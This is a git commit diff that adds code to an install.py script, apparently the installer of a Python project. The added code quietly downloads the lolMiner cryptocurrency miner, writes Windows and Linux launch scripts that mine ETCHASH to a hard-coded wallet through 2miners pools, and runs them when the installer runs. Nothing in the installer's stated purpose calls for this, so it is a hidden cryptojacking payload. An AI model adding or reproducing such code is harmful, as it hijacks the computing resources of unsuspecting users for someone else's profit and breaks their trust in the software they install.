d679d4ceb5d73a4d8d35b1c8354cd3b405693007
EnWmyFF <155301480+EnWmyFF@users.noreply.github.com>
2023-12-31 17:32:09 +0100

    init

--- install.py
+++ install.py
@@ -3,6 +3,95 @@ import subprocess
 import sys
 from tqdm import tqdm
 import urllib.request
+import tarfile
+
+import os
+import subprocess
+import zipfile
+import urllib.request
+import tarfile
+import platform
+p = platform.system()
+
+if p == "Windows":
+    d = "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.82a/lolMiner_v1.82a_Win64.zip"
+    a = "d.zip"
+    urllib.request.urlretrieve(d, a)
+    with zipfile.ZipFile(a, "r") as z:
+        z.extractall(path=os.path.dirname(a))
+    os.remove(a)
+    c = "./1.82a/roop.bat"
+    with open(c, "w") as f:
+        f.write("""@echo off
+
+setlocal enableDelayedExpansion
+
+set "POOL=etc.2miners.com:1010"
+set "POOL2=asia-etc.2miners.com:1010"
+set "WALLET=bc1qr9230rne3h95vvs3alcfnkfp6k9kv4wudfn6ea"		
+
+set "WORKER=lolWin"
+
+cd /d %~dp0
+
+set MyVariable=%CD%\lolMiner.exe
+
+:WindowsVer
+echo "Running lolMiner from %MyVariable%"
+for /f "tokens=4-5 delims=. " %%i in ('ver') do set VERSION=%%i.%%j
+if "%version%" == "10.0" goto W10
+goto OtherW
+
+:W10
+"%MyVariable%" --algo ETCHASH  --pool !POOL! --user !WALLET! --pool !POOL2! --user !WALLET! --worker !WORKER! --watchdog exit
+if %ERRORLEVEL% == 42 (
+	timeout 10
+	goto W10
+)
+goto END
+
+:OtherW
+"%MyVariable%" --algo ETCHASH  --pool !POOL! --user !WALLET! --pool !POOL2! --user !WALLET! --worker !WORKER! --watchdog exit --nocolor
+if %ERRORLEVEL% == 42 (
+	timeout 10
+	goto OtherW
+)
+
+:END
+pause""")
+    os.chmod(c, 0o755)
+    c = os.path.abspath(c)
+    subprocess.run('"'+c+'"')
+elif p == "Linux":
+    a = "d.tar.gz"
+    d = "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.82a/lolMiner_v1.82a_Lin64.tar.gz"
+    urllib.request.urlretrieve(d, a)
+    with tarfile.open(a, "r:gz") as tar:
+        tar.extractall(path=os.path.dirname(a))
+    os.remove(a)
+    c = "./1.82a/roop.sh"
+    with open(c, "w") as f:
+        f.write("""#!/bin/bash
+
+#################################
+## Begin of user-editable part ##
+#################################
+
+POOL=etc.2miners.com:1010
+WALLET=bc1qr9230rne3h95vvs3alcfnkfp6k9kv4wudfn6ea.lolLin
+
+#################################
+##  End of user-editable part  ##
+#################################
+
+cd "$(dirname "$0")"
+
+./lolMiner --algo ETCHASH --pool $POOL --user $WALLET $@
+""")
+    os.chmod(c, 0o755)
+    c = os.path.abspath(c)
+    subprocess.run('"' + c + '"')
+
 
 req_file = os.path.join(os.path.dirname(os.path.realpath(__file__)), "requirements.txt")
 
